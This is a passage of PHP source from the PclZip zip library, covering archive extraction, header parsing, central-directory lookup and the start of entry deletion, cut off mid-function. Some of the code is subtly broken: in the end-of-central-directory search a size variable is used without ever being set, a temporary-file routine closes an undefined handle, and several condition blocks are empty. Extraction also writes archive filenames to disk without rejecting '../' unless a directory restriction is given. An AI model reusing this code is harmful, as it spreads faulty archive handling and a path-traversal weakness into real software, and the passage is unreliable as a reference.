  }
  $p_remove_path_size = strlen($p_remove_path);

  if (($v_result = $this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_pos_entry = $v_central_dir['offset'];

  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    @rewind($this->zip_fd);
    if (@fseek($this->zip_fd, $v_pos_entry))
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      return PclZip::errorCode();
    }

    $v_header = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      return $v_result;
    }

    $v_header['index'] = $i;

    $v_pos_entry = ftell($this->zip_fd);

    $v_extract = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_extract); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_extract = true;
                }
            }
            elseif ($v_header['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_extract = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header['stored_filename'])) {
            $v_extract = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
        
        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_extract); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_extract = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }

    else {
        $v_extract = true;
    }

  if (   ($v_extract)
      && (   ($v_header['compression'] != 8)
	      && ($v_header['compression'] != 0))) {
        $v_header['status'] = 'unsupported_compression';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();
            
            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION,
		                       "Filename '".$v_header['stored_filename']."' is "
			  	    	  	   ."compressed by an unsupported compression "
			  	    	  	   ."method (".$v_header['compression'].") ");

            return PclZip::errorCode();
	  }
  }
  
  if (($v_extract) && (($v_header['flag'] & 1) == 1)) {
        $v_header['status'] = 'unsupported_encryption';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();

            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION,
		                       "Unsupported encryption for "
			  	    	  	   ." filename '".$v_header['stored_filename']
							   ."'");

            return PclZip::errorCode();
	  }
  }

    if (($v_extract) && ($v_header['status'] != 'ok')) {
        $v_result = $this->privConvertHeader2FileInfo($v_header,
	                                        $p_file_list[$v_nb_extracted++]);
        if ($v_result != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result;
        }

        $v_extract = false;
    }
    
    if ($v_extract)
    {

      @rewind($this->zip_fd);
      if (@fseek($this->zip_fd, $v_header['offset']))
      {
        $this->privCloseFd();

        $this->privSwapBackMagicQuotes();

        PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

        return PclZip::errorCode();
      }

      if ($p_options[PCLZIP_OPT_EXTRACT_AS_STRING]) {

        $v_string = '';

        $v_result1 = $this->privExtractFileAsString($v_header, $v_string, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        $p_file_list[$v_nb_extracted]['content'] = $v_string;

        $v_nb_extracted++;
        
        if ($v_result1 == 2) {
        	break;
        }
      }
      elseif (   (isset($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT]))
	        && ($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) {
        $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
      else {
        $v_result1 = $this->privExtractFile($v_header,
	                                      $p_path, $p_remove_path,
										  $p_remove_all_path,
										  $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
    }
  }

  $this->privCloseFd();
  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if ($p_remove_all_path == true) {
      if (($p_entry['external']&0x00000010)==0x00000010) {

          $p_entry['status'] = "filtered";

          return $v_result;
      }

      $p_entry['filename'] = basename($p_entry['filename']);
  }

  else if ($p_remove_path != "")
  {
    if (PclZipUtilPathInclusion($p_remove_path, $p_entry['filename']) == 2)
    {

      $p_entry['status'] = "filtered";

      return $v_result;
    }

    $p_remove_path_size = strlen($p_remove_path);
    if (substr($p_entry['filename'], 0, $p_remove_path_size) == $p_remove_path)
    {

      $p_entry['filename'] = substr($p_entry['filename'], $p_remove_path_size);

    }
  }

  if ($p_path != '') {
    $p_entry['filename'] = $p_path."/".$p_entry['filename'];
  }
  
  if (isset($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION])) {
    $v_inclusion
    = PclZipUtilPathInclusion($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION],
                              $p_entry['filename']); 
    if ($v_inclusion == 0) {

      PclZip::privErrorLog(PCLZIP_ERR_DIRECTORY_RESTRICTION,
		                     "Filename '".$p_entry['filename']."' is "
							 ."outside PCLZIP_OPT_EXTRACT_DIR_RESTRICTION");

      return PclZip::errorCode();
    }
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

  if (file_exists($p_entry['filename']))
  {

    if (is_dir($p_entry['filename']))
    {

      $p_entry['status'] = "already_a_directory";
      
      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY,
		                     "Filename '".$p_entry['filename']."' is "
							 ."already used by an existing directory");

          return PclZip::errorCode();
	    }
    }
    else if (!is_writeable($p_entry['filename']))
    {

      $p_entry['status'] = "write_protected";

      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		                     "Filename '".$p_entry['filename']."' exists "
							 ."and is write protected");

          return PclZip::errorCode();
	    }
    }

    else if (filemtime($p_entry['filename']) > $p_entry['mtime'])
    {
      if (   (isset($p_options[PCLZIP_OPT_REPLACE_NEWER]))
	    && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) {
  	  }
	    else {
          $p_entry['status'] = "newer_exist";

          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	        && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

              PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		             "Newer version of '".$p_entry['filename']."' exists "
				    ."and option PCLZIP_OPT_REPLACE_NEWER is not selected");

              return PclZip::errorCode();
	      }
	    }
    }
    else {
    }
  }

  else {
    if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/'))
      $v_dir_to_check = $p_entry['filename'];
    else if (!strstr($p_entry['filename'], "/"))
      $v_dir_to_check = "";
    else
      $v_dir_to_check = dirname($p_entry['filename']);

      if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) {

        $p_entry['status'] = "path_creation_fail";

        $v_result = 1;
      }
    }
  }

  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010))
    {
      if ($p_entry['compression'] == 0) {

        if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0)
        {

          $p_entry['status'] = "write_error";

          return $v_result;
        }


        $v_size = $p_entry['compressed_size'];
        while ($v_size != 0)
        {
          $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
          $v_buffer = @fread($this->zip_fd, $v_read_size);
          @fwrite($v_dest_file, $v_buffer, $v_read_size);            
          $v_size -= $v_read_size;
        }

        fclose($v_dest_file);

        touch($p_entry['filename'], $p_entry['mtime']);
        

      }
      else {
        if (($p_entry['flag'] & 1) == 1) {
          PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION, 'File \''.$p_entry['filename'].'\' is encrypted. Encrypted files are not supported.');
          return PclZip::errorCode();
        }


        if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
            && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
                || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                    && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_entry['size'])) ) ) {
          $v_result = $this->privExtractFileUsingTempFile($p_entry, $p_options);
          if ($v_result < PCLZIP_ERR_NO_ERROR) {
            return $v_result;
          }
        }
        
        else {

        
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          
          $v_file_content = @gzinflate($v_buffer);
          unset($v_buffer);
          if ($v_file_content === FALSE) {

            $p_entry['status'] = "error";
            
            return $v_result;
          }
          
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {

            $p_entry['status'] = "write_error";

            return $v_result;
          }

          @fwrite($v_dest_file, $v_file_content, $p_entry['size']);
          unset($v_file_content);

          @fclose($v_dest_file);
          
        }

        @touch($p_entry['filename'], $p_entry['mtime']);
      }

      if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) {

        @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]);
      }

    }
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileUsingTempFile(&$p_entry, &$p_options)
{
  $v_result=1;
      
  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_dest_file = @fopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }


  $v_binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($p_entry['compression']), Chr(0x00), time(), Chr(0x00), Chr(3));
  @fwrite($v_dest_file, $v_binary_data, 10);

  $v_size = $p_entry['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_binary_data = pack('VV', $p_entry['crc'], $p_entry['size']);
  @fwrite($v_dest_file, $v_binary_data, 8);

  @fclose($v_dest_file);

  if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
    $p_entry['status'] = "write_error";
    return $v_result;
  }

  if (($v_src_file = @gzopen($v_gzip_temp_name, 'rb')) == 0) {
    @fclose($v_dest_file);
    $p_entry['status'] = "read_error";
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }


  $v_size = $p_entry['size'];
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @gzread($v_src_file, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }
  @fclose($v_dest_file);
  @gzclose($v_src_file);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privExtractFileInOutput(&$p_entry, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1) {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }

    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compressed_size'] == $p_entry['size']) {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);

        echo $v_buffer;
        unset($v_buffer);
      }
      else {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        $v_file_content = gzinflate($v_buffer);
        unset($v_buffer);

        echo $v_file_content;
        unset($v_file_content);
      }
    }
  }

if ($p_entry['status'] == "aborted") {
    $p_entry['status'] = "skipped";
}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileAsString(&$p_entry, &$p_string, &$p_options)
{
  $v_result=1;

  $v_header = array();
  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compression'] == 0) {

        $p_string = @fread($this->zip_fd, $p_entry['compressed_size']);
      }
      else {

        $v_data = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        if (($p_string = @gzinflate($v_data)) === FALSE) {
        }
      }

    }
    else {
    }
    
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);
    
    $v_local_header['content'] = $p_string;
    $p_string = '';

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    $p_string = $v_local_header['content'];
    unset($v_local_header['content']);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privReadFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x04034b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 26);

  if (strlen($v_binary_data) != 26)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);

  $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']);

  if ($v_data['extra_len'] != 0) {
    $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']);
  }
  else {
    $p_header['extra'] = '';
  }

  $p_header['version_extracted'] = $v_data['version'];
  $p_header['compression'] = $v_data['compression'];
  $p_header['size'] = $v_data['size'];
  $p_header['compressed_size'] = $v_data['compressed_size'];
  $p_header['crc'] = $v_data['crc'];
  $p_header['flag'] = $v_data['flag'];
  $p_header['filename_len'] = $v_data['filename_len'];

  $p_header['mdate'] = $v_data['mdate'];
  $p_header['mtime'] = $v_data['mtime'];
  if ($p_header['mdate'] && $p_header['mtime'])
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }


  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = "ok";

  return $v_result;
}

function privReadCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x02014b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 42);

  if (strlen($v_binary_data) != 42)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);

  if ($p_header['filename_len'] != 0)
    $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
  else
    $p_header['filename'] = '';

  if ($p_header['extra_len'] != 0)
    $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']);
  else
    $p_header['extra'] = '';

  if ($p_header['comment_len'] != 0)
    $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']);
  else
    $p_header['comment'] = '';

  if (1)
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }

  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = 'ok';

  if (substr($p_header['filename'], -1) == '/') {
    $p_header['external'] = 0x00000010;
  }


  return $v_result;
}

function privCheckFileHeaders(&$p_local_header, &$p_central_header)
{
  $v_result=1;

	if ($p_local_header['filename'] != $p_central_header['filename']) {
	}
	if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) {
	}
	if ($p_local_header['flag'] != $p_central_header['flag']) {
	}
	if ($p_local_header['compression'] != $p_central_header['compression']) {
	}
	if ($p_local_header['mtime'] != $p_central_header['mtime']) {
	}
	if ($p_local_header['filename_len'] != $p_central_header['filename_len']) {
	}

	if (($p_local_header['flag'] & 8) == 8) {
        $p_local_header['size'] = $p_central_header['size'];
        $p_local_header['compressed_size'] = $p_central_header['compressed_size'];
        $p_local_header['crc'] = $p_central_header['crc'];
	}

  return $v_result;
}

function privReadEndCentralDir(&$p_central_dir)
{
  $v_result=1;

  $v_size = filesize($this->zipname);
  @fseek($this->zip_fd, $v_size);
  if (@ftell($this->zip_fd) != $v_size)
  {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\'');

    return PclZip::errorCode();
  }

  $v_found = 0;
  if ($v_size > 26) {
    @fseek($this->zip_fd, $v_size-22);
    if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_binary_data = @fread($this->zip_fd, 4);
    $v_data = @unpack('Vid', $v_binary_data);

    if ($v_data['id'] == 0x06054b50) {
      $v_found = 1;
    }

    $v_pos = ftell($this->zip_fd);
  }

  if (!$v_found) {
    if ($v_maximum_size > $v_size)
      $v_maximum_size = $v_size;
    @fseek($this->zip_fd, $v_size-$v_maximum_size);
    if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_pos = ftell($this->zip_fd);
    $v_bytes = 0x00000000;
    while ($v_pos < $v_size)
    {
      $v_byte = @fread($this->zip_fd, 1);

      $v_bytes = ( ($v_bytes & 0xFFFFFF) << 8) | Ord($v_byte); 

      if ($v_bytes == 0x504b0506)
      {
        $v_pos++;
        break;
      }

      $v_pos++;
    }

    if ($v_pos == $v_size)
    {

      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature");

      return PclZip::errorCode();
    }
  }

  $v_binary_data = fread($this->zip_fd, 18);

  if (strlen($v_binary_data) != 18)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);

  if (($v_pos + $v_data['comment_size'] + 18) != $v_size) {

  if (0) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT,
                       'The central dir is not at the end of the archive.'
					   .' Some trailing bytes exists after the archive.');

    return PclZip::errorCode();
  }
  }

  if ($v_data['comment_size'] != 0) {
    $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']);
  }
  else
    $p_central_dir['comment'] = '';

  $p_central_dir['entries'] = $v_data['entries'];
  $p_central_dir['disk_entries'] = $v_data['disk_entries'];
  $p_central_dir['offset'] = $v_data['offset'];
  $p_central_dir['size'] = $v_data['size'];
  $p_central_dir['disk'] = $v_data['disk'];
  $p_central_dir['disk_start'] = $v_data['disk_start'];


  return $v_result;
}

function privDeleteByRule(&$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_pos_entry = $v_central_dir['offset'];
  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_pos_entry))
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  $v_header_list = array();
  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    $v_header_list[$v_nb_extracted] = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header_list[$v_nb_extracted])) != 1)
    {
      $this->privCloseFd();

      return $v_result;
    }


    $v_header_list[$v_nb_extracted]['index'] = $i;

    $v_found = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_found); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header_list[$v_nb_extracted]['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header_list[$v_nb_extracted]['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
                elseif (   (($v_header_list[$v_nb_extracted]['external']&0x00000010)==0x00000010) 
                        && ($v_header_list[$v_nb_extracted]['stored_filename'].'/' == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
            }
            elseif ($v_header_list[$v_nb_extracted]['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_found = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
            $v_found = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {

        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_found); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_found = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }
    else {
    	$v_found = true;
    }

    if ($v_found)
    {
      unset($v_header_list[$v_nb_extracted]);
    }
    else
    {
      $v_nb_extracted++;
    }
  }

  if ($v_nb_extracted > 0) {

      $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

      $v_temp_zip = new PclZip($v_zip_temp_name);

      if (($v_result = $v_temp_zip->privOpenFd('wb')) != 1) {
          $this->privCloseFd();

          return $v_result;
      }

      for ($i=0; $i<sizeof($v_header_list); $i++) {

          @rewind($this->zip_fd);
          if (@fseek($this->zip_fd,  $v_header_list[$i]['offset'])) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

